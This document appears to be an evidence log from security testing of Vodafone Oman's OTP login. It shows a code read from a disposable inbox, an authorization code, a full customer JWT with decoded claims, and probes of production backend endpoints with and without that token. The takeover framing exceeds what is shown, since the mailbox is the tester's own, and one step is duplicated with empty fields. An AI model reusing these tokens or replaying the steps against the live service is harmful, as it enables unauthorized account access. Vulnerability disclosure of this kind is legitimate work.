@@ -1,0 +1,64 @@
+=== ATO EVIDENCE SUMMARY (2026-10-14, UTC) ===
+
+TARGET MAILBOX (disposable, mail.tm): h1bf4850864b@maxxspace.com
+
+[1] RESEND accepted (self-issued code):
+{"step": "resend", "cyc": 1, "status": null, "exp": 899, "rsend": 59, "ts": "12:33:30Z"}
+
+[2] NEW CODE read from victim mailbox inbox (mail.tm API):
+{"step": "new_inbox_code", "code": "3140", "ts": "12:33:46Z"}
+
+[3] OTP 3140 submitted -> ACCEPTED (redirectUri issued):
+    otpStatus: None
+    redirectUri: https://esgw.pr.itcloud.vodafone.om/authorized?code=ac_gHE5SKDo6d45ujZkULDr2h5VN3OX6H0UsVQIGWhx&state=e18c8866-26da-4294-96b4-d5471ceee4fe
+    raw (truncated): {"redirectUri":"https://esgw.pr.itcloud.vodafone.om/authorized?code=ac_gHE5SKDo6d45ujZkULDr2h5VN3OX6H0UsVQIGWhx&state=e18c8866-26da-4294-96b4-d5471ceee4fe"}
+
+[3] OTP 3140 submitted -> ACCEPTED (redirectUri issued):
+    otpStatus: None
+    redirectUri: 
+    raw (truncated): 
+
+[4] PKCE exchange -> customer JWT
+    JWT: eyJraWQiOiI2YjVlZTE3YjE2YjQ0YTBmYTJlN2FjMDE4MWM4NTBjYyIsImFsZyI6IlJTMjU2In0.eyJzdWIiOiJpbmV0OmU5MDVkOTVmLTMxZTItNDg5OS1hYjE4LWRmZWQxYjUyZTZmMyIsImF1ZCI6WyJNVkFfWkRTIiwiRFhMX1NQTSIsIkRYTF9aTVMiLCJDSEFUIiwiTVZBIiwiRFhMX09UUCIsIkRYTF9DWEMiLCJEWExfU0NNIiwiPFZGTz4iXSwiY19oYXNoIjoicWpPS1pOblpHbmRLbjdVdWxsam1FQSIsImF6cCI6Ik1WQSIsImF1dGhfdGltZSI6MTc5MTk4MTIyNiwic2NvcGUiOlsiY3VzdG9tZXJzIl0sImlzcyI6Imh0dHBzOi8vaXNndy5wci5pdGNsb3VkLnZvZGFmb25lLm9tIiwiZXhwIjoxNzkxOTgzMDI3LCJjdXN0b21lcl9pZCI6ImU5MDVkOTVmLTMxZTItNDg5OS1hYjE4LWRmZWQxYjUyZTZmMyIsImlhdCI6MTc5MTk4MTIyNywiZW1haWwiOiJoMWJmNDg1MDg2NGJAbWF4eHNwYWNlLmNvbSJ9.JklPT44CbJG2s6OVYbnuI0KGGNXRF32lTks0QcEe8O_LfE0lgr82wbc2OZcTt-jWXfA9TASbZz66swJqKZzTImIXODa8-xlwVKenNVkB2GmmehQ9nnVy9I1DCBAjEJXpAvqEKor2Qcm-Waym5HuiQTPYeZbHevoZ5FVMZ4TNisRAodfTF_7N89RT6y1Ooh15jxmw8WdDgTAe0E8zJbCMm2PQ1-mbgFAT7f7BiyBK0yLOeN9pofPkbHfzdm_ALKgupNgCphIYl2HSImpUeQzJ3PnMdrP-Y8t1tSEIglm65sPfMwfeYnMkklHAT17l0l9geovUuN0AsFNmbHfrFBHntA
+
+    CLAIMS:
+{
+    "sub": "inet:e905d95f-31e2-4899-ab18-dfed1b52e6f3",
+    "aud": [
+        "MVA_ZDS",
+        "DXL_SPM",
+        "DXL_ZMS",
+        "CHAT",
+        "MVA",
+        "DXL_OTP",
+        "DXL_CXC",
+        "DXL_SCM",
+        "<VFO>"
+    ],
+    "c_hash": "qjOKZNnZGndKn7UulljmEA",
+    "azp": "MVA",
+    "auth_time": 1791981226,
+    "scope": [
+        "customers"
+    ],
+    "iss": "https://isgw.pr.itcloud.vodafone.om",
+    "exp": 1791983027,
+    "customer_id": "e905d95f-31e2-4899-ab18-dfed1b52e6f3",
+    "iat": 1791981227,
+    "email": "h1bf4850864b@maxxspace.com"
+}
+
+[5] JWT accepted by backend services (contrast 401 without):
+    vfo02 /api/public/profile/v1            : HTTP 500
+        raw: Exception in exception handler: Failed to convert from type [com.zentity.gw.exception.BadRequestException] to type [com.zentity.gw.exception.ExceptionDescription] for value [com.zentity.gw.exception.BadRequestException@1b26391d]; nested exception is java.lang.IllegalArgumentException: Unmatched brac
+    vfo03 /chat/customer/v1/agents/availab. : HTTP 200
+        raw: {"anyAgentAvailable":false}
+
+    Follow-up probes with same JWT (~12:47Z):
+    vfo02/api/public/profile/v1                HTTP 500  Exception in exception handler: Failed to convert from type [com.zentity.gw.exception.BadRequestException] to type [com.
+    vfo02/api/public/profile/v1/paymentMethods HTTP 500  Exception in exception handler: Failed to convert from type [com.zentity.gw.exception.BadRequestException] to type [com.
+    vfo02/api/public/profile/v2/kyc/configuration HTTP 400  {"errors":[{"message":"Unsupported HTTP method GET"}]}
+    vfo02-noauth/api/public/profile/v1         HTTP 401  {"errors":[{"message":"Unauthorized","action":"LOGOUT"}]}
+    vfo03/chat/customer/v1/agents/availability HTTP 200  {"anyAgentAvailable":false}
+
+Timeline: 12:33:08 session start -> 12:33:30 code issued -> 12:33:46 code read from inbox -> 12:33:48 JWT minted. Total ~40s from first request to valid customer session.
